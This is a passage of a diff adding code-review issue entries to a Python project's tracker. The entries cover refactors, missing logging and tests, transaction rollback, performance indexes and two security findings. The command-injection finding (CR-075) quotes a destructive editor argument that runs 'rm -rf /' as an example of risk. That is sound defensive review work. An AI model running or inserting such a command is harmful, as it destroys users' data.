+- `client.py` with SDK integration requiring mocked tests
+
+### Affected Files
+- `src/dot_work/harness/` (all files)
+- `tests/unit/harness/` (missing directory)
+
+### Importance
+Autonomous agent execution without tests is high risk. Bugs could cause unintended agent behavior.
+
+### Proposed Solution
+1. Create `tests/unit/harness/` directory
+2. Add tests for `load_tasks`, `count_done`, `next_open_task`, `validate_task_file`
+3. Add integration tests with mocked SDK client
+
+### Acceptance Criteria
+- [ ] Test directory created
+- [ ] Pure functions have unit tests
+- [ ] Client integration tested with mocks
+
+---
+
+---
+id: "CR-011@f9a1b7"
+title: "Knowledge graph Database class is a god object with 50+ methods"
+description: "db.py has 1800+ lines with mixing concerns"
+created: 2024-12-27
+section: "knowledge_graph"
+tags: [architecture, refactor, maintainability]
+type: refactor
+priority: high
+status: proposed
+references:
+  - src/dot_work/knowledge_graph/db.py
+---
+
+### Problem
+The `Database` class in `db.py` has grown to 1800+ lines with 50+ methods covering documents, nodes, edges, FTS, embeddings, collections, topics, and project settings. This violates SRP.
+
+### Affected Files
+- `src/dot_work/knowledge_graph/db.py`
+
+### Importance
+God classes are hard to test, maintain, and extend. Changes have high risk of unintended side effects.
+
+### Proposed Solution
+Consider splitting into focused repositories:
+- `DocumentRepository`
+- `NodeRepository`
+- `EdgeRepository`
+- `EmbeddingRepository`
+- `CollectionRepository`
+
+### Acceptance Criteria
+- [ ] Database class responsibilities clearly defined
+- [ ] Consider extraction of focused repositories
+- [ ] Tests continue to pass after refactoring
+
+---
+
+---
+id: "CR-012@a0b2c8"
+title: "Duplicated scope filtering code in knowledge_graph search modules"
+description: "ScopeFilter and _build_scope_sets duplicated in search_fts.py and search_semantic.py"
+created: 2024-12-27
+section: "knowledge_graph"
+tags: [duplicate-code, refactor]
+type: refactor
+priority: high
+status: proposed
+references:
+  - src/dot_work/knowledge_graph/search_fts.py
+  - src/dot_work/knowledge_graph/search_semantic.py
+---
+
+### Problem
+Both `search_fts.py` and `search_semantic.py` contain nearly identical `ScopeFilter` dataclass (lines 34-48 and 31-45) and `_build_scope_sets()` / `_node_matches_scope()` functions (90%+ code duplication).
+
+### Affected Files
+- `src/dot_work/knowledge_graph/search_fts.py`
+- `src/dot_work/knowledge_graph/search_semantic.py`
+
+### Importance
+Duplicated code means changes must be made in two places. Risk of divergent behavior.
+
+### Proposed Solution
+Extract to a shared `scope.py` module:
+1. Move `ScopeFilter` dataclass
+2. Move `_build_scope_sets()` function
+3. Move `_node_matches_scope()` function
+4. Import in both search modules
+
+### Acceptance Criteria
+- [ ] Shared scope.py created
+- [ ] No duplication between search modules
+- [ ] All tests pass
+
+---
+
+---
+id: "CR-013@b1c3d9"
+title: "Mutable dimensions state in embedders causes unpredictable behavior"
+description: "Embedding dimension mutated during embed() calls can cause race conditions"
+created: 2024-12-27
+section: "knowledge_graph"
+tags: [bug, state-management, concurrency]
+type: bug
+priority: high
+status: proposed
+references:
+  - src/dot_work/knowledge_graph/embed/ollama.py
+  - src/dot_work/knowledge_graph/embed/openai.py
+---
+
+### Problem
+In `ollama.py:36` and `openai.py:63-64`, `dimensions` is set from config but then mutated during `embed()` calls (ollama.py:61-62, openai.py:165-166). This mutation of presumably-immutable config state can cause race conditions in concurrent usage.
+
+### Affected Files
+- `src/dot_work/knowledge_graph/embed/ollama.py`
+- `src/dot_work/knowledge_graph/embed/openai.py`
+
+### Importance
+Race conditions in embedders could cause incorrect vector dimensions, corrupting the embedding database.
+
+### Proposed Solution
+1. Don't mutate `self.dimensions` after initialization
+2. Validate dimensions at initialization time
+3. Or make dimension discovery a one-time operation with locking
+
+### Acceptance Criteria
+- [ ] No mutation of config state after init
+- [ ] Thread-safe embedding operations
+- [ ] Tests verify dimension consistency
+
+---
+
+---
+id: "CR-014@c2d4e0"
+title: "No logging in knowledge_graph graph.py and db.py"
+description: "Graph building and database operations are invisible without logging"
+created: 2024-12-27
+section: "knowledge_graph"
+tags: [observability, logging]
+type: enhancement
+priority: high
+status: proposed
+references:
+  - src/dot_work/knowledge_graph/graph.py
+  - src/dot_work/knowledge_graph/db.py
+---
+
+### Problem
+`graph.py` has no logging statements in the graph building process. `db.py` (1800+ lines) also has no logging. When ingestion fails or produces unexpected results, there's no way to trace what happened.
+
+### Affected Files
+- `src/dot_work/knowledge_graph/graph.py`
+- `src/dot_work/knowledge_graph/db.py`
+
+### Importance
+Without logging, failures are undebuggable. Large ingestion jobs provide no feedback.
+
+### Proposed Solution
+1. Add structured logging for key operations in graph.py
+2. Add logging for schema migrations, connection lifecycle, errors in db.py
+3. Use appropriate log levels (DEBUG for verbose, INFO for milestones)
+
+### Acceptance Criteria
+- [ ] Logging added to graph building
+- [ ] Logging added to database operations
+- [ ] Error conditions logged at WARNING/ERROR
+
+---
+
+---
+id: "CR-015@d3e5f1"
+title: "overview/cli.py is dead code"
+description: "The overview CLI module is never used - main CLI imports directly from pipeline"
+created: 2024-12-27
+section: "overview"
+tags: [dead-code, cleanup]
+type: refactor
+priority: high
+status: proposed
+references:
+  - src/dot_work/overview/cli.py
+  - src/dot_work/cli.py
+---
+
+### Problem
+`overview/cli.py` defines its own Typer app, but `src/dot_work/cli.py` imports and uses `analyze_project` and `write_outputs` directly from the pipeline. The overview-specific CLI is never registered as a subcommand or used.
+
+### Affected Files
+- `src/dot_work/overview/cli.py`
+- `src/dot_work/cli.py`
+
+### Importance
+Dead code increases maintenance burden and cognitive load.
+
+### Proposed Solution
+1. Delete `src/dot_work/overview/cli.py`
+2. Or integrate it properly as a subcommand if the functionality is needed
+
+### Acceptance Criteria
+- [ ] Dead code removed or integrated
+- [ ] Existing functionality preserved
+
+---
+
+---
+id: "CR-016@e4f6a2"
+title: "No logging in overview code_parser.py makes debugging impossible"
+description: "Parse failures, metric calculations, and errors are silent"
+created: 2024-12-27
+section: "overview"
+tags: [observability, logging]
+type: enhancement
+priority: high
+status: proposed
+references:
+  - src/dot_work/overview/code_parser.py
+  - src/dot_work/overview/pipeline.py
+  - src/dot_work/overview/scanner.py
+---
+
+### Problem
+`code_parser.py` has no logging. Parse failures (line 85-86), metric calculation errors (lines 56-57, 70-71), and other issues return empty/zero values silently. `pipeline.py` and `scanner.py` also lack logging.
+
+### Affected Files
+- `src/dot_work/overview/code_parser.py`
+- `src/dot_work/overview/pipeline.py`
+- `src/dot_work/overview/scanner.py`
+
+### Importance
+When parsing fails or metrics return zeros, there's no way to diagnose without adding print statements.
+
+### Proposed Solution
+1. Add structured logging for parse failures
+2. Log metric calculation issues
+3. Add progress logging for pipeline
+
+### Acceptance Criteria
+- [ ] Parse failures logged
+- [ ] Metric errors logged
+- [ ] Progress visible during analysis
+
+---
+
+---
+id: "CR-017@f5a7b3"
+title: "Bare exception handlers swallow errors in review/server.py"
+description: "Multiple except Exception blocks silently return empty values"
+created: 2024-12-27
+section: "review"
+tags: [error-handling, observability]
+type: bug
+priority: high
+status: proposed
+references:
+  - src/dot_work/review/server.py
+---
+
+### Problem
+In `server.py:90-93` and `server.py:131-135`, multiple `except Exception` blocks silently swallow errors and return empty values. AGENTS.md prohibits bare `except:`. These silent failures make debugging impossible when file reads fail.
+
+### Affected Files
+- `src/dot_work/review/server.py`
+
+### Importance
+Silent failures mask bugs. Users see empty results with no indication of errors.
+
+### Proposed Solution
+1. Catch specific exceptions (`FileNotFoundError`, `UnicodeDecodeError`)
+2. Log errors before returning empty values
+3. Consider returning error status to client
+
+### Acceptance Criteria
+- [ ] Specific exceptions caught
+- [ ] Errors logged
+- [ ] No bare except Exception
+
+---
+
+---
+id: "CR-018@a6b8c4"
+title: "SearchService uses raw Session breaking architectural consistency"
+description: "SearchService takes Session instead of UnitOfWork unlike all other services"
+created: 2024-12-27
+section: "db_issues"
+tags: [architecture, consistency]
+type: refactor
+priority: high
+status: proposed
+references:
+  - src/dot_work/db_issues/services/search_service.py
+---
+
+### Problem
+In `search_service.py:25-31`, `SearchService` takes a raw `Session` parameter while all other services use `UnitOfWork`. This breaks architectural consistency and makes composition difficult.
+
+### Affected Files
+- `src/dot_work/db_issues/services/search_service.py`
+
+### Importance
+Inconsistent interfaces make the codebase harder to understand and test.
+
+### Proposed Solution
+1. Change SearchService to accept UnitOfWork
+2. Update all call sites
+3. Maintain consistent service interface
+
+### Acceptance Criteria
+- [ ] SearchService uses UnitOfWork
+- [ ] All services have consistent constructor signature
+
+---
+
+---
+id: "CR-019@b7c9d5"
+title: "IssueService merge_issues method is 148 lines"
+description: "Single method handles too many responsibilities, violates <15 lines guideline"
+created: 2024-12-27
+section: "db_issues"
+tags: [code-quality, refactor]
+type: refactor
+priority: high
+status: proposed
+references:
+  - src/dot_work/db_issues/services/issue_service.py
+---
+
+### Problem
+`merge_issues` method (lines 843-991) is 148 lines long, handling labels, descriptions, dependencies, comments, and source issue disposal. This violates the "Functions <15 lines" standard from AGENTS.md.
+
+### Affected Files
+- `src/dot_work/db_issues/services/issue_service.py` (lines 843-991)
+
+### Importance
+Long methods are hard to test, understand, and maintain.
+
+### Proposed Solution
+Decompose into smaller private methods:
+- `_merge_labels()`
+- `_merge_description()`
+- `_merge_dependencies()`
+- `_merge_comments()`
+- `_dispose_source_issue()`
+
+### Acceptance Criteria
+- [ ] Method decomposed into <15 line functions
+- [ ] Tests continue to pass
+- [ ] Improved readability
+
+---
+
+---
+id: "CR-020@c8d0e6"
+title: "Missing tests for StatsService and SearchService"
+description: "Services with raw SQL queries have no test coverage"
+created: 2024-12-27
+section: "db_issues"
+tags: [testing, quality]
+type: test
+priority: high
+status: proposed
+references:
+  - src/dot_work/db_issues/services/stats_service.py
+  - src/dot_work/db_issues/services/search_service.py
+  - tests/unit/db_issues/
+---
+
+### Problem
+No tests found for `StatsService` or `SearchService`. Given these contain raw SQL queries, this is a high-risk area that needs test coverage.
+
+### Affected Files
+- `src/dot_work/db_issues/services/stats_service.py`
+- `src/dot_work/db_issues/services/search_service.py`
+
+### Importance
+Raw SQL without tests is high risk. FTS5 behavior varies and needs verification.
+
+### Proposed Solution
+1. Create tests for StatsService SQL queries
+2. Create tests for SearchService FTS5 queries
+3. Add integration tests for search edge cases
+
+### Acceptance Criteria
+- [ ] StatsService has test coverage
+- [ ] SearchService has test coverage
+- [ ] FTS5 edge cases tested
+
+---
+
+---
+id: "CR-021@d9e1f7"
+title: "Epic and label services load all issues into memory"
+description: "Methods use limit=1000000 causing potential OOM on large datasets"
+created: 2024-12-27
+section: "db_issues"
+tags: [performance, memory]
+type: bug
+priority: high
+status: proposed
+references:
+  - src/dot_work/db_issues/services/epic_service.py
+  - src/dot_work/db_issues/services/label_service.py
+---
+
+### Problem
+`get_all_epics_with_counts`, `get_epic_issues`, `get_epic_tree` (epic_service.py lines 346-373, 397-399, 427-429) and `get_all_labels_with_counts` (label_service.py line 410) all load ALL issues into memory with `limit=1000000`. For large datasets, this will cause memory issues.
+
+### Affected Files
+- `src/dot_work/db_issues/services/epic_service.py`
+- `src/dot_work/db_issues/services/label_service.py`
+
+### Importance
+Memory exhaustion on large projects. Silent degradation as project grows.
+
+### Proposed Solution
+1. Use SQL-level filtering and GROUP BY for counts
+2. Implement pagination or streaming for large result sets
+3. Add warnings or limits for result sizes
+
+### Acceptance Criteria
+- [ ] Counts computed at SQL level
+- [ ] No unbounded memory allocations
+- [ ] Large project support verified
+
+---
+
+---
+id: "CR-022@e0f2a8"
+title: "Uncaught exception on malformed version string in version/manager.py"
+description: "calculate_next_version uses int(parts[X]) without validation"
+created: 2024-12-27
+section: "version"
+tags: [error-handling, robustness]
+type: bug
+priority: high
+status: proposed
+references:
+  - src/dot_work/version/manager.py
+---
+
+### Problem
+In `manager.py:80-83`, `calculate_next_version()` uses `int(parts[X])` without validation. If `current.version` is malformed (e.g., "1.2" instead of "2025.01.00001"), this raises an uncaught `IndexError` or `ValueError` with no helpful message.
+
+### Affected Files
+- `src/dot_work/version/manager.py` (lines 80-83)
+
+### Importance
+Users with custom or legacy version strings will get cryptic errors.
+
+### Proposed Solution
+1. Validate version format before parsing
+2. Raise descriptive error on invalid format
+3. Document expected version format
+
+### Acceptance Criteria
+- [ ] Invalid versions raise clear error
+- [ ] Format documented
+- [ ] Tests for edge cases
+
+---
+
+---
+id: "CR-023@f1a3b9"
+title: "freeze_version is 72 lines with multiple responsibilities"
+description: "Method handles reading, parsing, changelog, git tagging, file writing"
+created: 2024-12-27
+section: "version"
+tags: [code-quality, refactor]
+type: refactor
+priority: high
+status: proposed
+references:
+  - src/dot_work/version/manager.py
+---
+
+### Problem
+`freeze_version()` in `manager.py:140-212` is 72 lines long with multiple responsibilities: reading current version, parsing commits, generating changelog, creating git tags, writing files, committing. This violates the "Functions <15 lines" standard from AGENTS.md and makes it hard to test individual steps.
+
+### Affected Files
+- `src/dot_work/version/manager.py` (lines 140-212)
+
+### Importance
+Long methods are hard to test and maintain. Changes have high risk.
+
+### Proposed Solution
+Decompose into smaller functions:
+- `_read_current_version()`
+- `_generate_changelog_entry()`
+- `_create_git_tag()`
+- `_write_version_files()`
+- `_commit_version_changes()`
+
+### Acceptance Criteria
+- [ ] Method decomposed
+- [ ] Individual steps testable
+- [ ] Existing behavior preserved
+
+---
+
+---
+id: "CR-024@a2b4c0"
+title: "Git operations in freeze_version have no transaction/rollback"
+description: "Failed tag creation followed by successful file write leaves inconsistent state"
+created: 2024-12-27
+section: "version"
+tags: [error-handling, consistency]
+type: bug
+priority: high
+status: proposed
+references:
+  - src/dot_work/version/manager.py
+---
+
+### Problem
+Git operations in `manager.py:177-199` (`create_tag`, `index.add`, `index.commit`) can all fail but have no error handling. A failed `create_tag` followed by a successful `write_version` leaves the system in an inconsistent state.
+
+### Affected Files
+- `src/dot_work/version/manager.py` (lines 177-199)
+
+### Importance
+Partial failures can corrupt version state, requiring manual recovery.
+
+### Proposed Solution
+1. Wrap in transaction pattern
+2. Add rollback logic for partial failures
+3. Or fail fast before any writes
+
+### Acceptance Criteria
+- [ ] All-or-nothing semantics
+- [ ] Clear error messages on failure
+- [ ] Recovery path documented
+
+---
+
+---
+id: "CR-025@b3c5d1"
+title: "Off-by-one error in yaml_validator frontmatter parsing"
+description: "Frontmatter content slicing may cut off content incorrectly"
+created: 2024-12-27
+section: "tools"
+tags: [bug, parsing]
+type: bug
+priority: high
+status: proposed
+references:
+  - src/dot_work/tools/yaml_validator.py
+---
+
+### Problem
+In `yaml_validator.py:184`, `fm_content = "\n".join(lines[1 : end_idx - 1])` - the slicing appears off by one. For frontmatter `---\nkey: val\n---`, this would get lines 2 to `end_idx-2`, potentially cutting off content. This appears to be a bug.
+
+### Affected Files
+- `src/dot_work/tools/yaml_validator.py` (line 184)
+
+### Importance
+Incorrect parsing could lose frontmatter data silently.
+
+### Proposed Solution
+1. Verify the slice boundaries with test cases
+2. Fix off-by-one if confirmed
+3. Add tests for edge cases (empty frontmatter, single line, etc.)
+
+### Acceptance Criteria
+- [ ] Parsing verified correct
+- [ ] Edge cases tested
+- [ ] No data loss
+
+---
+
+---
+id: "CR-026@c4d6e2"
+title: "Empty init method says CanonicalPromptParser is stateless but uses class"
+description: "Classes with empty __init__ should be functions or use @staticmethod"
+created: 2024-12-27
+section: "prompts"
+tags: [architecture, simplification]
+type: refactor
+priority: high
+status: proposed
+references:
+  - src/dot_work/prompts/canonical.py
+---
+
+### Problem
+`CanonicalPromptParser.__init__` (lines 119-121) is an empty method (`pass`). Same for `CanonicalPromptValidator.__init__` (lines 201-203). The classes hold no state and could be implemented as pure functions or `@staticmethod`.
+
+### Affected Files
+- `src/dot_work/prompts/canonical.py`
+
+### Importance
+Unnecessary class instantiation adds overhead and complexity.
+
+### Proposed Solution
+1. Convert to module-level functions, or
+2. Use `@staticmethod` for methods, or
+3. Create module-level singletons to avoid repeated instantiation
+
+### Acceptance Criteria
+- [ ] Simplified API
+- [ ] No unnecessary instantiation
+- [ ] Existing functionality preserved
+
+---
+
+---
+id: "CR-027@d5e7f3"
+title: "Inline bash script in container/provision prevents independent versioning"
+description: "175-line bash script embedded as string literal requires Python release to change"
+created: 2024-12-27
+section: "container/provision"
+tags: [architecture, maintainability]
+type: refactor
+priority: high
+status: proposed
+references:
+  - src/dot_work/container/provision/core.py
+---
+
+### Problem
+The inline bash script in `core.py:535-726` (~175 lines) is a string literal. Any change requires a Python release. This makes iteration on the script difficult and prevents independent testing.
+
+### Affected Files
+- `src/dot_work/container/provision/core.py` (lines 535-726)
+
+### Importance
+Changes to container behavior require full release cycle. Script cannot be tested in isolation.
+
+### Proposed Solution
+1. Load script from a separate `.sh` file
+2. Or use a Jinja template for customization
+3. Consider moving more logic to Python for testability
+
+### Acceptance Criteria
+- [ ] Script can be modified independently
+- [ ] Script is testable
+- [ ] Existing functionality preserved
+
+---
+
+---
+id: "CR-075@c0d6e4"
+title: "Command Injection Risk via EDITOR Environment Variable"
+description: "Subprocess calls execute user-supplied editor arguments without sanitization"
+created: 2024-12-27
+section: "db_issues"
+tags: [security, command-injection, subprocess, editor]
+type: security
+priority: high
+status: proposed
+references:
+  - src/dot_work/db_issues/cli.py
+---
+
+### Problem
+In `cli.py:1272-1300, 1370-1376`, multiple CLI commands execute user-supplied `$EDITOR` via `subprocess.run()`:
+
+```python
+editor_name, editor_args = _validate_editor(os.environ.get("EDITOR"))
+
+result = subprocess.run([editor_name, *editor_args, str(temp_path)])
+```
+
+The `_validate_editor()` function (lines 1243-1269) only checks against a whitelist but doesn't:
+
+1. **Sanitize editor arguments** - user can supply `vim -c "exec system('rm -rf /')"` if editor config is compromised
+2. **Prevent shell metacharacters** - if shell is ever invoked accidentally
+3. **Validate temp file path** before passing to editor
+4. **Use explicit `shell=False`** - relies on default but not explicit
+
+**Specific risks:**
+- Editor whitelist bypass through environment variable manipulation
+- Malicious editor arguments if user config is compromised
+- Shell metacharacters in editor paths/arguments
+
+### Affected Files
+- `src/dot_work/db_issues/cli.py` (lines 1243-1300, 1370-1376)
+
+### Importance
+**HIGH**: Command injection enables:
+- Arbitrary code execution with user privileges
+- File system manipulation via editor commands
+- Potential privilege escalation
+- Data destruction if malicious commands executed
+
+While editor validation exists, argument sanitization is missing.
+
+### Proposed Solution
+1. Use `shlex.quote()` to sanitize all editor arguments
+2. Set `shell=False` explicitly in all subprocess.run() calls
+3. Validate no shell metacharacters in editor configuration
+4. Consider using `subprocess.Popen()` with controlled args
+5. Add unit tests with malicious editor arguments
+6. Review all subprocess.run() calls across codebase for consistent sanitization
+
+### Acceptance Criteria
+- [ ] All editor arguments sanitized with `shlex.quote()`
+- [ ] Explicit `shell=False` in all subprocess calls
+- [ ] No shell metacharacters accepted in editor config
+- [ ] Unit tests for injection attempts
+- [ ] Security review of all subprocess usage
 
 ### Notes
-- Source test file: `incoming/kg/tests/integration/test_build_pipeline.py`
-- Destination test file: `tests/integration/knowledge_graph/test_build_pipeline.py`
-- This is a clear migration bug - simple oversight during import updates
-- See investigation: `.work/agent/issues/references/AUDIT-KG-001-investigation.md`
+This is related to CR-032 and should be addressed together. A subprocess wrapper utility could ensure consistent security defaults across the codebase.
+
+---
+
+---
+id: "CR-076@d1e7f5"
+title: "Missing Transaction Rollback in SearchService.rebuild_index()"
+description: "FTS index rebuild commits without error handling causing data loss on failure"
+created: 2024-12-27
+section: "db_issues"
+tags: [database, transaction-safety, rollback, fts]
+type: bug
+priority: high
+status: proposed
+references:
+  - src/dot_work/db_issues/services/search_service.py
+---
+
+### Problem
+In `search_service.py:89-111`, `rebuild_index()` commits changes without error handling or rollback:
+
+```python
+def rebuild_index(self) -> int:
+    # Clear existing FTS data
+    self.session.exec(text("DELETE FROM issues_fts;"))
+
+    # Rebuild from issues table
+    self.session.exec(text("""
+    INSERT INTO issues_fts(rowid, id, title, description)
+    SELECT rowid, id, title, COALESCE(description, '')
+    FROM issues;
+    """))
+
+    self.session.commit()  # LINE 107 - No try/except, no rollback on error
+
+    # Count indexed issues
+    count_result = self.session.exec(text("SELECT COUNT(*) as cnt FROM issues_fts;"))
+    return count_result.first().cnt if count_result else 0
+```
+
+**Failure scenarios:**
+- If INSERT fails (constraint violation, disk full, etc.) after DELETE is committed
+- If COUNT fails after INSERT succeeds
+- If exception occurs between commit and return
+
+**Result:**
+- FTS index is cleared but not rebuilt
+- All searches return zero results
+- No transaction rollback to restore previous state
+- Search functionality permanently broken until manual intervention
+
+### Affected Files
+- `src/dot_work/db_issues/services/search_service.py` (lines 89-111)
+
+### Importance
+**HIGH**: Missing transaction rollback causes:
+- Complete loss of search functionality on partial failures
+- Silent data corruption (FTS empty but no error message)
+- Production incidents requiring manual database recovery
+- No all-or-nothing semantics for critical operation
+
+This is related to CR-053 (inconsistent transaction management) and should be addressed together.
+
+### Proposed Solution
+1. Wrap entire operation in try/except with explicit rollback on error
+2. Use UnitOfWork context manager for consistent transaction handling
+3. Log all failures before rollback with context
+4. Verify index integrity after rebuild (count matches issues table)
+5. Add unit tests for failure scenarios
+6. Consider atomic FTS rebuild using temporary table and rename
+
+### Acceptance Criteria
+- [ ] Operation wrapped in try/except with rollback
+- [ ] Consistent transaction pattern with UnitOfWork
+- [ ] Failures logged before rollback
+- [ ] Index integrity verified after successful rebuild
+- [ ] Unit tests for INSERT failure, COUNT failure scenarios
+- [ ] No silent data loss
+
+### Notes
+Current implementation risks leaving search in broken state. Consider using SQLite's SAVEPOINT for partial transaction support or atomic rebuild pattern (build in temp table, DELETE, rename).
+
+---
+
+---
+id: "CR-077@e2f8a6"
+title: "OpenAI API Key Leaked in Error Messages"
+description: "API key may be exposed in logs, exceptions, and error responses"
+created: 2024-12-27
+section: "knowledge_graph"
+tags: [security, credentials, logging, api-keys]
+type: security
+priority: high
+status: proposed
+references:
+  - src/dot_work/knowledge_graph/embed/openai.py
+---
+
+### Problem
+In `openai.py:50-52`, API key is stored and used without proper secret handling:
+
+```python
+self.api_key = config.api_key or os.environ.get("OPENAI_API_KEY")
+
+# Error message
+msg = "OpenAI API key required (set OPENAI_API_KEY or pass api_key)"
+```
+
+While this specific error message doesn't leak the key, there are risks throughout the module and calling code:
+
+1. **Exception context** - If OpenAI client raises exceptions with config context, key may be included
+2. **Debug logging** - If logger is configured to log exception info, key appears in logs
+3. **Error reporting systems** - Stack traces sent to monitoring services include key
+4. **String formatting** - f-strings or str() on config objects may expose key
+5. **No constant-time comparison** - Timing attacks on key validation (less critical but still best practice)
+
+**Missing protections:**
+- Key masking/redaction in all error paths
+- Secure logging of API-related errors
+- Never include raw key in exception context or logs
+
+### Affected Files
+- `src/dot_work/knowledge_graph/embed/openai.py`
+
+### Importance
+**HIGH**: API key leakage enables:
+- Unauthorized access to OpenAI account
+- Billing fraud if key used for malicious API calls
+- Key revocation and service disruption
+- Security audit failures
+
+Once leaked, keys must be rotated immediately. Detection of leakage is difficult.
+
+### Proposed Solution
+1. Implement key masking utility function (`sk-****...<last4>`)
+2. Redact API key in all error messages and logging
+3. Use constant-time string comparison for key validation
+4. Implement safe repr() for config objects
+5. Review all error handling paths for key exposure
+6. Add integration tests that verify key never appears in logs/exceptions
+7. Document key handling security requirements
+
+### Acceptance Criteria
+- [ ] Key masking function implemented
+- [ ] All error messages redact API key
+- [ ] Logs never contain raw API key
+- [ ] Exception context redacts API key
+- [ ] Tests verify key not in logs/exceptions
+- [ ] Documentation updated with security requirements
+
+### Notes
+This is similar to CR-001 (plaintext git credentials) - both involve secrets handling. A unified secrets management approach across the codebase would prevent similar issues.
+
+---
+
+---
+id: "CR-078@f3a9b7"
+title: "Test Collection Failures Masking Real Issues"
+description: "103 test collection errors prevent test suite execution, hiding bugs"
+created: 2024-12-27
+section: "testing"
+tags: [testing, infrastructure, quality]
+type: bug
+priority: high
+status: proposed
+references:
+  - incoming/kg/tests/unit/
+  - tests/
+---
+
+### Problem
+The test suite has 103 collection errors during `pytest --collect-only`:
+
+```
+!!!!!!!!!!!!!!!!!! Interrupted: 103 errors during collection !!!!!!!!!!!!!!!!!!
+================== 1555 tests collected, 103 errors in 2.63s ===================
+```
+
+**Implications:**
+1. Tests cannot even be executed (1555 collected but 103 errors)
+2. Test infrastructure issues mask real bugs in code
+3. False confidence in test coverage metrics
+4. CI may pass or fail unpredictably depending on test execution order
+5. Broken test references prevent catching regressions
+
+**Root causes identified:**
+- Tests from `incoming/kg/tests/unit/` are causing import/collection errors
+- 75 test files exist but collection failures prevent execution
+- References to modules/packages that no longer exist or moved
+
+### Affected Files
+- `incoming/kg/tests/unit/` (multiple files with errors)
+- `tests/` (indirectly affected by infrastructure issues)
+
+### Importance
+**HIGH**: Broken test suite causes:
+- Inability to verify code correctness
+- Undetected bugs reaching production
+- False sense of security from "1555 tests"
+- CI/CD pipeline unreliability
+- Developer time wasted investigating why tests fail
+
+A test suite that cannot run provides zero value and hides real problems.
+
+### Proposed Solution
+1. Fix all 103 test collection errors in knowledge_graph tests
+2. Remove or update broken test references (`incoming/kg`)
+3. Fix import errors in test files
+4. Add CI gate to fail fast on collection errors
+5. Ensure all tests can be collected and executed before running full suite
+6. Add pre-commit hook to validate test collection
+7. Document test infrastructure requirements
+
+### Acceptance Criteria
+- [ ] All 103 collection errors resolved
+- [ ] `pytest --collect-only` completes with 0 errors
+- [ ] All tests can execute successfully
+- [ ] CI gate fails on collection errors
+- [ ] Pre-commit hook validates test collection
+- [ ] Test infrastructure documented
+
+### Notes
+This is a critical quality issue. The existence of 103 collection errors suggests significant technical debt in the test infrastructure. Addressing this should be a priority before adding new features.
+
+---
+id: "PERF-003@h3i4j5"
+title: "Missing Database Indexes on Edge Type Column"
+description: "FTS edge queries perform full table scans due to missing index"
+created: 2024-12-27
+section: "knowledge_graph"
+tags: [performance, database, index, query-optimization]
+type: refactor
+priority: high
+status: proposed
+references:
+  - src/dot_work/knowledge_graph/db.py
+---
+
+### Problem
+In `db.py:842-859`, `get_edges_by_type()` queries edges table without index on type column:
+
+```python
+def get_edges_by_type(self, edge_type: str) -> list[Edge]:
+    # No index on 'type' column
+    cur = conn.execute("""
+        SELECT src_node_pk, dst_node_pk, type, weight, meta_json
+        FROM edges WHERE type = ?
+        """, (edge_type,))
+```
+
+**Performance issue:**
+- `edges` table has index on `src_node_pk` and `dst_node_pk`
+- **No index on `type` column** despite filtering by type
+- Query performs full table scan on every `get_edges_by_type()` call
+- Called frequently during graph traversal and search operations
+
+**Impact:**
+- Graph operations slow down as node count increases
+- 10,000 edges without type index = full table scan (~10ms)
+- 100,000 edges = noticeable latency (100ms+) in graph queries
+- Scales poorly with knowledge base size
+
+### Affected Files
+- `src/dot_work/knowledge_graph/db.py` (lines 842-859)
+
+### Importance
+**HIGH**: Affects all knowledge graph operations and user experience:
+- Full table scans for every edge type query
+- Latency grows linearly with edge count
+- Makes large knowledge graphs slow to search and navigate
+- Simple database fix with massive performance impact
+
+### Proposed Solution
+Add composite index on `(type, src_node_pk, dst_node_pk)`:
+
+```sql
+CREATE INDEX IF NOT EXISTS idx_edges_type_src_dst
+ON edges(type, src_node_pk, dst_node_pk);
+```
+
+Index creation in migration:
+```python
+def migrate_add_edge_type_index(self):
+    conn = self.get_connection()
+    conn.execute("""
+        CREATE INDEX IF NOT EXISTS idx_edges_type_src_dst
+        ON edges(type, src_node_pk, dst_node_pk)
+    """)
+    conn.commit()
+```
+
+### Acceptance Criteria
+- [ ] Composite index on (type, src_node_pk, dst_node_pk) created
+- [ ] Migration script adds index to existing databases
+- [ ] Performance test: 100k edges query < 10ms
+- [ ] Index included in schema initialization
+
+### Notes
+This is a low-effort, high-impact optimization. Adding the index should provide 10-100x speedup for edge type queries. Consider adding similar indexes for other frequently filtered columns.
+
+---
+id: "PERF-004@i4j5k6"
+title: "Inefficient Bulk Operations in IssueRepository.save()"
+description: "Labels/assignees saved one-by-one causing M+1 database queries"
+created: 2024-12-27
+section: "db_issues"
+tags: [performance, database, bulk-operations, n-plus-one]
+type: refactor
+priority: high
+status: proposed
+references:
+  - src/dot_work/db_issues/adapters/sqlite.py
+---
+
+### Problem
+In `sqlite.py:371-425`, `save()` performs individual DELETE/INSERT queries for labels/assignees:
+
+```python
+def save(self, issue: Issue) -> Issue:
+    # Labels: Individual DELETE queries
+    statement = select(IssueLabelModel).where(IssueLabelModel.issue_id == issue.id)
+    existing_labels = self.session.exec(statement).all()
+    for label_model in existing_labels:
+        self.session.delete(label_model)  # N queries
+    self.session.flush()
+    
+    # Labels: Individual INSERT queries
+    for label_name in issue.labels:
+        label_model = IssueLabelModel(issue_id=issue.id, label_name=label_name, ...)
+        self.session.add(label_model)  # N queries
+    self.session.flush()
+    
+    # Same pattern for assignees (N+1) and references (K+1)
+```
+
+**Performance issue:**
+- Deleting/inserting labels/assignees one-by-one
+- M+1 database round-trips for M labels
+- Same pattern repeated for assignees (N+1) and references (K+1)
+- Total queries per issue save = 1 (issue) + 2M (labels) + 2N (assignees) + 2K (references)
+
+**Impact:**
+- Issue creation/editing slows down with more labels/assignees
+- Bulk issue operations (import/export) become prohibitively slow
+- 10 labels + 3 assignees + 5 refs = ~47 database round-trips per issue
+- 1000 issues with avg 5 labels = 5000+ extra queries
+
+### Affected Files
+- `src/dot_work/db_issues/adapters/sqlite.py` (lines 371-425)
+
+### Importance
+**HIGH**: Severely impacts bulk operations and performance:
+- Issue operations become slow as metadata grows
+- Makes large-scale issue management impractical
+- Import/export operations take minutes instead of seconds
+- Wastes database connection pool capacity
+
+### Proposed Solution
+Use bulk DELETE and bulk INSERT operations:
+
+```python
+def save(self, issue: Issue) -> Issue:
+    # ... issue save ...
+
+    # Bulk delete all labels for issue
+    if existing_labels:
+        self.session.exec(
+            text("DELETE FROM issue_labels WHERE issue_id = :issue_id"),
+            {"issue_id": issue.id}
+        )
+    
+    # Bulk insert all labels
+    if issue.labels:
+        now = datetime.now(timezone.utc)
+        label_values = [(issue.id, label, now) for label in issue.labels]
+        self.session.exec(
+            text("""
